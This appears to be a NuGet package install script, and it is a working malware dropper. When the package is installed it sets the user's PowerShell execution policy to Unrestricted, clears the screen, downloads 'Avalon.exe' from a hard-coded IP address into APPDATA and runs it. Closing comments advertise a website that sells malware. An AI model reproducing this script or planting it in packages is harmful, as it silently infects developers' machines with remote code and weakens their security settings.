param($installPath, $toolsPath, $package)
New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force
$ProcName = "Avalon.exe"
$WebFile = "http://194.233.93.50/$ProcName"
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA$ProcName")
Start-Process ("$env:APPDATA$ProcName")
# You know Avalon :o
# Selling Malware at https://kekma.net (REAL)